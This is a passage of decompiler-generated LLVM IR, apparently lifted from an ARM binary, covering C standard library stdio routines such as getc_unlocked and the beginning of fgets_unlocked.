  %v2_18988 = inttoptr i32 %v1_18988 to i16*
  %v3_18988 = load i16, i16* %v2_18988, align 2
  %v4_18988 = zext i16 %v3_18988 to i32
  store i32 %v4_18988, i32* %r3.global-to-local, align 4
  %v2_1898c = add i32 %v1_18988, 8
  %v3_1898c = inttoptr i32 %v2_1898c to i32*
  %v4_1898c = load i32, i32* %v3_1898c, align 4
  store i32 %v4_1898c, i32* %r2.global-to-local, align 4
  %v2_18990 = and i32 %v4_18988, 65471
  store i32 %v2_18990, i32* %r3.global-to-local, align 4
  %v3_18994 = add i32 %v1_18988, 28
  %v4_18994 = inttoptr i32 %v3_18994 to i32*
  store i32 %v4_1898c, i32* %v4_18994, align 4
  %v1_18998 = load i32, i32* %r3.global-to-local, align 4
  %v2_18998 = trunc i32 %v1_18998 to i16
  %v3_18998 = load i32, i32* @r5, align 4
  %v4_18998 = inttoptr i32 %v3_18998 to i16*
  store i16 %v2_18998, i16* %v4_18998, align 2
  br label %bb71

.thread7:                                         ; preds = %dec_label_pc_1897c
  %v1_1899c = load i32, i32* %fp.global-to-local, align 4
  store i32 %v1_1899c, i32* %sl.global-to-local, align 4
  br label %bb71

bb71:                                             ; preds = %.thread6, %dec_label_pc_18964, %.thread7
  %v0_189a0 = load i32, i32* @r6, align 4
  %v1_189a0 = load i32, i32* %sb.global-to-local, align 4
  %v2_189a0 = add i32 %v1_189a0, %v0_189a0
  %v3_189a0 = inttoptr i32 %v2_189a0 to i32*
  %v4_189a0 = load i32, i32* %v3_189a0, align 4
  store i32 %v4_189a0, i32* %r3.global-to-local, align 4
  %v1_189a4 = inttoptr i32 %v4_189a0 to i32*
  %v2_189a4 = load i32, i32* %v1_189a4, align 4
  store i32 %v2_189a4, i32* %r3.global-to-local, align 4
  %v2_189a8 = icmp ugt i32 %v2_189a4, 1
  store i1 %v2_189a8, i1* %cpsr_c.global-to-local, align 1
  %v7_189a8 = icmp eq i32 %v2_189a4, 2
  br i1 %v7_189a8, label %dec_label_pc_18a24, label %dec_label_pc_189b0

dec_label_pc_189b0:                               ; preds = %bb71
  %v0_189b0 = load i32, i32* @r5, align 4
  %v1_189b0 = add i32 %v0_189b0, 60
  %v2_189b0 = inttoptr i32 %v1_189b0 to i32*
  %v3_189b0 = load i32, i32* %v2_189b0, align 4
  %v1_189b4 = add i32 %v3_189b0, -1
  store i32 %v1_189b4, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_189b8 = icmp eq i32 %v1_189b4, 0
  store i32 %v1_189b4, i32* %v2_189b0, align 4
  br i1 %v2_189b8, label %dec_label_pc_189c4, label %dec_label_pc_18a24

dec_label_pc_189c4:                               ; preds = %dec_label_pc_189b0
  %v0_189c4 = load i32, i32* %r3.global-to-local, align 4
  %v1_189c4 = load i32, i32* @r5, align 4
  %v2_189c4 = add i32 %v1_189c4, 64
  %v3_189c4 = inttoptr i32 %v2_189c4 to i32*
  store i32 %v0_189c4, i32* %v3_189c4, align 4
  %v0_189c8 = load i32, i32* @r5, align 4
  %v1_189c8 = add i32 %v0_189c8, 56
  store i32 %v1_189c8, i32* @r7, align 4
  br label %dec_label_pc_189cc

dec_label_pc_189cc:                               ; preds = %dec_label_pc_189fc.dec_label_pc_189cc_crit_edge, %dec_label_pc_189c4
  %v0_189d4 = phi i32 [ %v0_189d4.pre, %dec_label_pc_189fc.dec_label_pc_189cc_crit_edge ], [ %v1_189c8, %dec_label_pc_189c4 ]
  %v0_189cc = phi i32 [ %v0_189cc.pre, %dec_label_pc_189fc.dec_label_pc_189cc_crit_edge ], [ %v0_189c8, %dec_label_pc_189c4 ]
  %v1_189cc = add i32 %v0_189cc, 56
  %v2_189cc = inttoptr i32 %v1_189cc to i32*
  %v3_189cc = load i32, i32* %v2_189cc, align 4
  store i32 %v3_189cc, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_189d4, i32* %r2.global-to-local, align 4
  %v1_189d897 = inttoptr i32 %v0_189d4 to i32*
  %v2_189d898 = load i32, i32* %v1_189d897, align 4
  store i32 %v2_189d898, i32* %r3.global-to-local, align 4
  %v3_189dc100 = icmp uge i32 %v2_189d898, %v3_189cc
  store i1 %v3_189dc100, i1* %cpsr_c.global-to-local, align 1
  %v9_189dc106 = icmp eq i32 %v2_189d898, %v3_189cc
  br i1 %v9_189dc106, label %dec_label_pc_189e4, label %dec_label_pc_189fc

dec_label_pc_189e4:                               ; preds = %dec_label_pc_189cc, %dec_label_pc_189e4.dec_label_pc_189d8_crit_edge
  %v0_189e4107 = phi i32 [ %v1_189dc.pre, %dec_label_pc_189e4.dec_label_pc_189d8_crit_edge ], [ %v3_189cc, %dec_label_pc_189cc ]
  store i32 %v0_189e4107, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_189f4 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_189f4, label %dec_label_pc_189f8, label %dec_label_pc_189e4.dec_label_pc_189d8_crit_edge

dec_label_pc_189e4.dec_label_pc_189d8_crit_edge:  ; preds = %dec_label_pc_189e4
  %v0_189d8.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_189dc.pre = load i32, i32* @r4, align 4
  %v1_189d8 = inttoptr i32 %v0_189d8.pre to i32*
  %v2_189d8 = load i32, i32* %v1_189d8, align 4
  store i32 %v2_189d8, i32* %r3.global-to-local, align 4
  %v3_189dc = icmp uge i32 %v2_189d8, %v1_189dc.pre
  store i1 %v3_189dc, i1* %cpsr_c.global-to-local, align 1
  %v9_189dc = icmp eq i32 %v2_189d8, %v1_189dc.pre
  br i1 %v9_189dc, label %dec_label_pc_189e4, label %dec_label_pc_189fc

dec_label_pc_189f8:                               ; preds = %dec_label_pc_189e4
  %v0_189f8 = load i32, i32* @r4, align 4
  store i32 %v0_189f8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_189fc

dec_label_pc_189fc:                               ; preds = %dec_label_pc_189cc, %dec_label_pc_189e4.dec_label_pc_189d8_crit_edge, %dec_label_pc_189f8
  %v0_18a04 = phi i32 [ %v0_189f8, %dec_label_pc_189f8 ], [ %v2_189d898, %dec_label_pc_189cc ], [ %v2_189d8, %dec_label_pc_189e4.dec_label_pc_189d8_crit_edge ]
  %v1_189fc = phi i32 [ %v0_189f8, %dec_label_pc_189f8 ], [ %v3_189cc, %dec_label_pc_189cc ], [ %v1_189dc.pre, %dec_label_pc_189e4.dec_label_pc_189d8_crit_edge ]
  %v3_189fc = icmp uge i32 %v0_18a04, %v1_189fc
  store i1 %v3_189fc, i1* %cpsr_c.global-to-local, align 1
  %v9_189fc = icmp eq i32 %v0_18a04, %v1_189fc
  br i1 %v9_189fc, label %dec_label_pc_18a04, label %dec_label_pc_189fc.dec_label_pc_189cc_crit_edge

dec_label_pc_189fc.dec_label_pc_189cc_crit_edge:  ; preds = %dec_label_pc_189fc
  %v0_189cc.pre = load i32, i32* @r5, align 4
  %v0_189d4.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_189cc

dec_label_pc_18a04:                               ; preds = %dec_label_pc_189fc
  %v2_18a04 = icmp ne i32 %v1_189fc, 0
  store i1 %v2_18a04, i1* %cpsr_c.global-to-local, align 1
  %v7_18a08 = icmp slt i32 %v1_189fc, 2
  br i1 %v7_18a08, label %dec_label_pc_18a24, label %dec_label_pc_18a0c

dec_label_pc_18a0c:                               ; preds = %dec_label_pc_18a04
  %v0_18a0c = load i32, i32* @r5, align 4
  %v1_18a0c = add i32 %v0_18a0c, 56
  store i32 %v1_18a0c, i32* %r0.global-to-local, align 4
  %v0_18a10 = load i32, i32* %r1.global-to-local, align 4
  %v1_18a10 = add i32 %v0_18a10, 129
  store i32 %v1_18a10, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_18a24

dec_label_pc_18a24:                               ; preds = %dec_label_pc_189b0, %dec_label_pc_18a0c, %dec_label_pc_18a04, %bb71, %dec_label_pc_188ec
  %v0_18a24 = load i32, i32* @r5, align 4
  %v1_18a24 = add i32 %v0_18a24, 32
  %v2_18a24 = inttoptr i32 %v1_18a24 to i32*
  %v3_18a24 = load i32, i32* %v2_18a24, align 4
  store i32 %v3_18a24, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_18a28 = icmp eq i32 %v3_18a24, 0
  br i1 %v2_18a28, label %dec_label_pc_18a30, label %dec_label_pc_188ec

dec_label_pc_18a30:                               ; preds = %dec_label_pc_18a24, %dec_label_pc_188dc
  %v0_18a30 = call i32 @_stdio_openlist_dec_use()
  store i32 %v0_18a30, i32* %r0.global-to-local, align 4
  %v0_18a6c.pre = load i32, i32* %sl.global-to-local, align 4
  br label %bb73

dec_label_pc_18a38:                               ; preds = %dec_label_pc_18714
  %v3_18a38 = load i16, i16* %arg1, align 2
  %v4_18a38 = zext i16 %v3_18a38 to i32
  %v1_18a3c = and i32 %v4_18a38, 64
  store i32 %v1_18a3c, i32* %r3.global-to-local, align 4
  %v2_18a3c = icmp eq i32 %v1_18a3c, 0
  br i1 %v2_18a3c, label %bb72, label %dec_label_pc_18a48

bb72:                                             ; preds = %dec_label_pc_18a38
  store i32 0, i32* %sl.global-to-local, align 4
  br label %bb73

dec_label_pc_18a48:                               ; preds = %dec_label_pc_18a38
  %v2_18a48 = call i32 @__stdio_wcommit(i32 %tmp)
  store i32 %v2_18a48, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_18a4c = icmp eq i32 %v2_18a48, 0
  br i1 %v2_18a4c, label %.thread14, label %.thread16

.thread16:                                        ; preds = %dec_label_pc_18a48
  store i32 -1, i32* %sl.global-to-local, align 4
  br label %bb73

.thread14:                                        ; preds = %dec_label_pc_18a48
  %v1_18a50 = load i32, i32* @r4, align 4
  %v2_18a50 = inttoptr i32 %v1_18a50 to i16*
  %v3_18a50 = load i16, i16* %v2_18a50, align 2
  %v4_18a50 = zext i16 %v3_18a50 to i32
  store i32 %v4_18a50, i32* %r3.global-to-local, align 4
  %v2_18a54 = add i32 %v1_18a50, 8
  %v3_18a54 = inttoptr i32 %v2_18a54 to i32*
  %v4_18a54 = load i32, i32* %v3_18a54, align 4
  store i32 %v4_18a54, i32* %r2.global-to-local, align 4
  %v2_18a58 = and i32 %v4_18a50, 65471
  store i32 %v2_18a58, i32* %r3.global-to-local, align 4
  %v2_18a5c = trunc i32 %v2_18a58 to i16
  store i16 %v2_18a5c, i16* %v2_18a50, align 2
  %v1_18a60 = load i32, i32* %r2.global-to-local, align 4
  %v2_18a60 = load i32, i32* @r4, align 4
  %v3_18a60 = add i32 %v2_18a60, 28
  %v4_18a60 = inttoptr i32 %v3_18a60 to i32*
  store i32 %v1_18a60, i32* %v4_18a60, align 4
  store i32 0, i32* %sl.global-to-local, align 4
  br label %bb73

bb73:                                             ; preds = %bb72, %.thread16, %dec_label_pc_18a30, %.thread14
  %v0_18a6c = phi i32 [ -1, %.thread16 ], [ 0, %bb72 ], [ %v0_18a6c.pre, %dec_label_pc_18a30 ], [ 0, %.thread14 ]
  store i32 %v0_18a6c, i32* %r0.global-to-local, align 4
  store i32 %v6_186e8, i32* %r5.global-to-local, align 4
  ret i32 %v0_18a6c

; uselistorder directives
  uselistorder i32 %v0_18a6c, { 1, 0 }
  uselistorder i32 %v3_18a24, { 1, 2, 0 }
  uselistorder i32 %v0_189f8, { 1, 0, 2 }
  uselistorder i32 %v1_189dc.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_1897c, { 1, 0, 2 }
  uselistorder i32 %v0_18944, { 1, 0, 2 }
  uselistorder i32 %v1_18928.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_1890c, { 1, 0 }
  uselistorder i32 %v0_188b0, { 1, 0, 2 }
  uselistorder i32 %v1_18894.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_18884, { 1, 0 }
  uselistorder i32 %v0_18848, { 1, 0, 2 }
  uselistorder i32 %v1_1882c.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_18814, { 1, 0 }
  uselistorder i32 %v0_187dc, { 1, 0, 2 }
  uselistorder i32 %v1_187c0.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_187b0, { 1, 0 }
  uselistorder i32 %v0_1876c, { 1, 0, 2 }
  uselistorder i32 %v1_18750.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v4_18728, { 2, 1, 0, 3 }
  uselistorder i32 %tmp, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32* %sl.global-to-local, { 0, 5, 1, 3, 2, 4 }
  uselistorder i32* %r5.global-to-local, { 0, 2, 1, 3, 4, 5, 6, 8, 7, 9 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 6, 5, 51, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 18, 17, 50, 19, 20, 21, 22, 23, 24, 26, 25, 52, 27, 28, 29, 30, 32, 31, 53, 33, 34, 35, 36, 38, 37, 54, 39, 40, 41, 42, 44, 43, 55, 45, 46, 49, 47, 48 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 9, 8, 10, 11, 12, 13, 14 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 5, 3, 4, 22, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 23, 0 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 11, 1, 2, 3, 31, 32, 4, 5, 6, 7, 8, 29, 30, 9, 10, 28, 12, 13, 14, 33, 34, 15, 16, 17, 35, 36, 18, 19, 20, 21, 37, 38, 22, 23, 24, 39, 40, 25, 26, 27 }
  uselistorder i32 92, { 0, 1, 2, 5, 3, 4, 6 }
  uselistorder i32 152, { 1, 3, 2, 4, 5, 8, 6, 9, 7, 10, 0, 11, 12, 14, 13, 15, 18, 16, 19, 17, 20 }
  uselistorder i32 129, { 7, 8, 9, 5, 6, 10, 11, 0, 1, 2, 3, 4, 12, 13 }
  uselistorder i32 -61504, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 34, 35, 36, 32, 33 }
  uselistorder i32 -61441, { 16, 17, 18, 19, 20, 21, 12, 13, 14, 15, 22, 23, 24, 25, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0, 31, 26, 27, 28, 29, 30 }
  uselistorder label %bb73, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_18a24, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_189fc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_189e4, { 1, 0 }
  uselistorder label %bb71, { 2, 0, 1 }
  uselistorder label %dec_label_pc_18964, { 1, 0 }
  uselistorder label %dec_label_pc_18958, { 1, 0 }
  uselistorder label %bb70, { 1, 0 }
  uselistorder label %dec_label_pc_18948, { 2, 1, 0 }
  uselistorder label %dec_label_pc_18930, { 1, 0 }
  uselistorder label %dec_label_pc_188ec, { 1, 0 }
  uselistorder label %dec_label_pc_188dcthread-pre-split, { 1, 0 }
  uselistorder label %dec_label_pc_188b4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1889c, { 1, 0 }
  uselistorder label %dec_label_pc_1885c, { 1, 0 }
  uselistorder label %bb68, { 1, 0 }
  uselistorder label %dec_label_pc_1884c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_18834, { 1, 0 }
  uselistorder label %dec_label_pc_18808, { 1, 2, 0 }
  uselistorder label %dec_label_pc_187e0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_187c8, { 1, 0 }
  uselistorder label %dec_label_pc_18780, { 1, 0 }
  uselistorder label %bb66, { 1, 0 }
  uselistorder label %dec_label_pc_18770, { 2, 1, 0 }
  uselistorder label %dec_label_pc_18758, { 1, 0 }
  uselistorder label %dec_label_pc_18724, { 1, 0 }
}

define i32 @function_18a80(i32 %arg1) local_unnamed_addr {
dec_label_pc_18a80:
  %v0_18a80 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_18a80, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_18a80
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_18a80, %bb
  %v10_18a90 = phi i32 [ %arg1, %dec_label_pc_18a80 ], [ 0, %bb ]
  ret i32 %v10_18a90

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @getc_unlocked(i16* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-17 = alloca i8, align 1
  %stack_var_-12 = alloca i32, align 4
  %v3_18a94 = load i32, i32* @r4, align 4
  store i32 %v3_18a94, i32* %stack_var_-12, align 4
  %v6_18a94 = load i32, i32* @r5, align 4
  %v9_18a94 = load i32, i32* @lr, align 4
  %v0_18a98 = load i32, i32* @r0, align 4
  %v1_18a98 = add i32 %v0_18a98, 16
  %v2_18a98 = inttoptr i32 %v1_18a98 to i32*
  %v3_18a98 = load i32, i32* %v2_18a98, align 4
  store i32 %v3_18a98, i32* %r2.global-to-local, align 4
  %v1_18a9c = add i32 %v0_18a98, 24
  %v2_18a9c = inttoptr i32 %v1_18a9c to i32*
  %v3_18a9c = load i32, i32* %v2_18a9c, align 4
  %v3_18aa0 = icmp ult i32 %v3_18a98, %v3_18a9c
  store i32 %v0_18a98, i32* @r4, align 4
  br i1 %v3_18aa0, label %bb, label %dec_label_pc_18ac0

bb:                                               ; preds = %entry
  %v2_18aac = inttoptr i32 %v3_18a98 to i8*
  %v3_18aac = load i8, i8* %v2_18aac, align 1
  %v4_18aac = zext i8 %v3_18aac to i32
  store i32 %v4_18aac, i32* %r0.global-to-local, align 4
  %v6_18aac = add i32 %v3_18a98, 1
  store i32 %v6_18aac, i32* %r2.global-to-local, align 4
  store i32 %v6_18aac, i32* %v2_18a98, align 4
  br label %dec_label_pc_18bac

dec_label_pc_18ac0:                               ; preds = %entry
  store i32 ptrtoint (i32* @global_var_24478.766 to i32), i32* @r5, align 4
  %v1_18ac0 = inttoptr i32 %v0_18a98 to i16*
  %v2_18ac0 = load i16, i16* %v1_18ac0, align 2
  %v3_18ac0 = zext i16 %v2_18ac0 to i32
  %v1_18ac4 = and i32 %v3_18ac0, 131
  %tmp25 = icmp ugt i32 %v1_18ac4, 128
  br i1 %tmp25, label %dec_label_pc_18ae0, label %dec_label_pc_18ad0

dec_label_pc_18ad0:                               ; preds = %dec_label_pc_18ac0
  store i32 128, i32* @r1, align 4
  %v0_18ad4 = call i32 @__stdio_trans2r_o()
  store i32 %v0_18ad4, i32* %r0.global-to-local, align 4
  %v2_18ad8 = icmp eq i32 %v0_18ad4, 0
  br i1 %v2_18ad8, label %dec_label_pc_18ad0.dec_label_pc_18ae0_crit_edge, label %dec_label_pc_18ba8

dec_label_pc_18ad0.dec_label_pc_18ae0_crit_edge:  ; preds = %dec_label_pc_18ad0
  %v0_18ae0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_18ae0

dec_label_pc_18ae0:                               ; preds = %dec_label_pc_18ad0.dec_label_pc_18ae0_crit_edge, %dec_label_pc_18ac0
  %v2_18b20 = phi i32 [ %v0_18ae0.pre, %dec_label_pc_18ad0.dec_label_pc_18ae0_crit_edge ], [ %v0_18a98, %dec_label_pc_18ac0 ]
  %v1_18ae0 = inttoptr i32 %v2_18b20 to i16*
  %v2_18ae0 = load i16, i16* %v1_18ae0, align 2
  %v3_18ae0 = zext i16 %v2_18ae0 to i32
  store i32 %v3_18ae0, i32* %r2.global-to-local, align 4
  %v1_18ae4 = and i32 %v3_18ae0, 2
  %v2_18ae4 = icmp eq i32 %v1_18ae4, 0
  br i1 %v2_18ae4, label %dec_label_pc_18b10, label %dec_label_pc_18aec

dec_label_pc_18aec:                               ; preds = %dec_label_pc_18ae0
  %tmp26 = urem i16 %v2_18ae0, 2
  %v1_18aec = zext i16 %tmp26 to i32
  %tmp22 = sub nsw i32 0, %v1_18aec
  %v4_18af0 = and i32 %tmp22, 4
  %v5_18af0 = add i32 %v4_18af0, %v2_18b20
  %v1_18af4 = add i32 %v5_18af0, 36
  %v2_18af4 = inttoptr i32 %v1_18af4 to i8*
  %v3_18af4 = load i8, i8* %v2_18af4, align 1
  %v4_18af4 = zext i8 %v3_18af4 to i32
  %v1_18af8 = add nsw i32 %v3_18ae0, -1
  store i32 %v1_18af8, i32* %r2.global-to-local, align 4
  store i32 %v4_18af4, i32* %r0.global-to-local, align 4
  %v2_18b04 = add i32 %v2_18b20, 40
  %v3_18b04 = inttoptr i32 %v2_18b04 to i32*
  store i32 0, i32* %v3_18b04, align 4
  %v0_18b08 = load i32, i32* %r2.global-to-local, align 4
  %v1_18b08 = trunc i32 %v0_18b08 to i16
  %v2_18b08 = load i32, i32* @r4, align 4
  %v3_18b08 = inttoptr i32 %v2_18b08 to i16*
  store i16 %v1_18b08, i16* %v3_18b08, align 2
  br label %dec_label_pc_18bac

dec_label_pc_18b10:                               ; preds = %dec_label_pc_18ae0
  %v1_18b10 = add i32 %v2_18b20, 16
  %v1_18b14 = inttoptr i32 %v1_18b10 to i32*
  %v2_18b14 = load i32, i32* %v1_18b14, align 4
  store i32 %v2_18b14, i32* @r1, align 4
  %v3_18b14 = add i32 %v2_18b20, 20
  %v4_18b14 = inttoptr i32 %v3_18b14 to i32*
  %v5_18b14 = load i32, i32* %v4_18b14, align 4
  %v9_18b18 = icmp eq i32 %v5_18b14, %v2_18b14
  br i1 %v9_18b18, label %dec_label_pc_18b28, label %.thread4

.thread4:                                         ; preds = %dec_label_pc_18b10
  %v2_18b1c = inttoptr i32 %v2_18b14 to i8*
  %v3_18b1c = load i8, i8* %v2_18b1c, align 1
  %v4_18b1c = zext i8 %v3_18b1c to i32
  store i32 %v4_18b1c, i32* %r0.global-to-local, align 4
  %v6_18b1c = add i32 %v2_18b14, 1
  store i32 %v6_18b1c, i32* @r1, align 4
  store i32 %v6_18b1c, i32* %v1_18b14, align 4
  br label %dec_label_pc_18bac

dec_label_pc_18b28:                               ; preds = %dec_label_pc_18b10
  %v1_18b28 = add i32 %v2_18b20, 4
  %v2_18b28 = inttoptr i32 %v1_18b28 to i32*
  %v3_18b28 = load i32, i32* %v2_18b28, align 4
  %v7_18b2c = icmp eq i32 %v3_18b28, -2
  br i1 %v7_18b2c, label %.thread7, label %dec_label_pc_18b40

.thread7:                                         ; preds = %dec_label_pc_18b28
  %v2_18b30 = or i16 %v2_18ae0, 4
  store i32 -1, i32* %r0.global-to-local, align 4
  store i16 %v2_18b30, i16* %v1_18ae0, align 2
  br label %dec_label_pc_18bac

dec_label_pc_18b40:                               ; preds = %dec_label_pc_18b28
  %v1_18b40 = and i32 %v3_18ae0, 768
  %v2_18b40 = icmp eq i32 %v1_18b40, 0
  br i1 %v2_18b40, label %.thread9, label %bb23

bb23:                                             ; preds = %dec_label_pc_18b40
  %v1_18b48 = load i32, i32* @r5, align 4
  %v3_18b48 = add i32 %v1_18b48, 76
  %v4_18b48 = inttoptr i32 %v3_18b48 to i32*
  %v5_18b48 = load i32, i32* %v4_18b48, align 4
  store i32 %v5_18b48, i32* %r0.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_18b40, %bb23
  store i32 101200, i32* @lr, align 4
  %v1_18b4c = xor i1 %v2_18b40, true
  call void @__pseudo_cond_branch(i1 %v1_18b4c, i32 ptrtoint (i32* @global_var_186e8.1017 to i32))
  %v0_18b50 = load i32, i32* @r4, align 4
  %v1_18b50 = add i32 %v0_18b50, 8
  store i32 %v1_18b50, i32* %r2.global-to-local, align 4
  %v1_18b54 = inttoptr i32 %v1_18b50 to i32*
  %v2_18b54 = load i32, i32* %v1_18b54, align 4
  store i32 %v2_18b54, i32* %r2.global-to-local, align 4
  %v3_18b54 = add i32 %v0_18b50, 12
  %v4_18b54 = inttoptr i32 %v3_18b54 to i32*
  %v5_18b54 = load i32, i32* %v4_18b54, align 4
  %v9_18b58 = icmp eq i32 %v5_18b54, %v2_18b54
  br i1 %v9_18b58, label %dec_label_pc_18b8c, label %dec_label_pc_18b60

dec_label_pc_18b60:                               ; preds = %.thread9
  %v2_18b60 = add i32 %v0_18b50, 24
  %v3_18b60 = inttoptr i32 %v2_18b60 to i32*
  store i32 %v2_18b54, i32* %v3_18b60, align 4
  %v0_18b64 = load i32, i32* @r4, align 4
  store i32 %v0_18b64, i32* %r0.global-to-local, align 4
  %v2_18b68 = call i32 @__stdio_rfill(i32 %v0_18b64)
  store i32 %v2_18b68, i32* %r0.global-to-local, align 4
  %v2_18b6c = icmp eq i32 %v2_18b68, 0
  br i1 %v2_18b6c, label %dec_label_pc_18ba8, label %dec_label_pc_18b74

dec_label_pc_18b74:                               ; preds = %dec_label_pc_18b60
  %v0_18b74 = load i32, i32* @r4, align 4
  %v1_18b74 = add i32 %v0_18b74, 20
  %v2_18b74 = inttoptr i32 %v1_18b74 to i32*
  %v3_18b74 = load i32, i32* %v2_18b74, align 4
  %v2_18b78 = add i32 %v0_18b74, 24
  %v3_18b78 = inttoptr i32 %v2_18b78 to i32*
  store i32 %v3_18b74, i32* %v3_18b78, align 4
  %v0_18b7c = load i32, i32* @r4, align 4
  %v1_18b7c = add i32 %v0_18b7c, 16
  %v2_18b7c = inttoptr i32 %v1_18b7c to i32*
  %v3_18b7c = load i32, i32* %v2_18b7c, align 4
  %v1_18b80 = inttoptr i32 %v3_18b7c to i8*
  %v2_18b80 = load i8, i8* %v1_18b80, align 1
  %v3_18b80 = zext i8 %v2_18b80 to i32
  store i32 %v3_18b80, i32* %r0.global-to-local, align 4
  %v5_18b80 = add i32 %v3_18b7c, 1
  store i32 %v5_18b80, i32* %v2_18b7c, align 4
  br label %dec_label_pc_18bac

dec_label_pc_18b8c:                               ; preds = %.thread9
  %v1_18b8c = inttoptr i32 %v0_18b50 to i16*
  store i32 %v0_18b50, i32* %r0.global-to-local, align 4
  %v2_18b90 = ptrtoint i8* %stack_var_-17 to i32
  store i32 %v2_18b90, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_18b98 = call i32 @__stdio_READ(i16* %v1_18b8c, i32 %v2_18b90, i32 1)
  store i32 %v5_18b98, i32* %r0.global-to-local, align 4
  %v2_18b9c = icmp eq i32 %v5_18b98, 0
  br i1 %v2_18b9c, label %dec_label_pc_18ba8, label %bb24

bb24:                                             ; preds = %dec_label_pc_18b8c
  %v4_18ba0 = load i8, i8* %stack_var_-17, align 1
  %v5_18ba0 = sext i8 %v4_18ba0 to i32
  store i32 %v5_18ba0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18bac

dec_label_pc_18ba8:                               ; preds = %dec_label_pc_18b8c, %dec_label_pc_18ad0, %dec_label_pc_18b60
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18bac

dec_label_pc_18bac:                               ; preds = %bb, %.thread7, %bb24, %.thread4, %dec_label_pc_18b74, %dec_label_pc_18aec, %dec_label_pc_18ba8
  %v2_18bb0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_18bb0, i32* @r4, align 4
  store i32 %v6_18a94, i32* @r5, align 4
  store i32 %v9_18a94, i32* @lr, align 4
  %v1_18bb4 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_18bb4

; uselistorder directives
  uselistorder i32 %v2_18b14, { 1, 0, 2, 3 }
  uselistorder i32 %v2_18b20, { 1, 3, 2, 4, 0, 5 }
  uselistorder i32 %v3_18a98, { 1, 0, 2, 3 }
  uselistorder i8* %stack_var_-17, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 11, 0, 1, 4, 2, 3, 6, 5, 7, 8, 9, 10, 13, 12 }
  uselistorder i32 768, { 1, 0, 2 }
  uselistorder label %dec_label_pc_18bac, { 6, 2, 4, 1, 3, 5, 0 }
  uselistorder label %dec_label_pc_18ba8, { 0, 2, 1 }
  uselistorder label %.thread9, { 1, 0 }
}

define i32 @__GI_fgets_unlocked(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v9_18bc0 = load i32, i32* @r6, align 4
  %v12_18bc0 = load i32, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_18bc4 = icmp eq i32 %arg2, 0
  store i1 %v2_18bc4, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* @r7, align 4
  store i32 %arg3, i32* @r4, align 4
  %tmp22 = icmp slt i32 %arg2, 1
  br i1 %tmp22, label %dec_label_pc_18c4c, label %dec_label_pc_18c34.preheader

dec_label_pc_18c34.preheader:                     ; preds = %entry
  store i32 %tmp, i32* @r5, align 4
  %v1_18c342 = add i32 %arg2, -1
  store i32 %v1_18c342, i32* @r6, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v7_18c348 = icmp eq i32 %arg2, 1
  store i1 %v7_18c348, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18c348, label %dec_label_pc_18c3c, label %dec_label_pc_18be0

dec_label_pc_18be0:                               ; preds = %dec_label_pc_18c34.preheader, %dec_label_pc_18c34.backedge.dec_label_pc_18be0_crit_edge
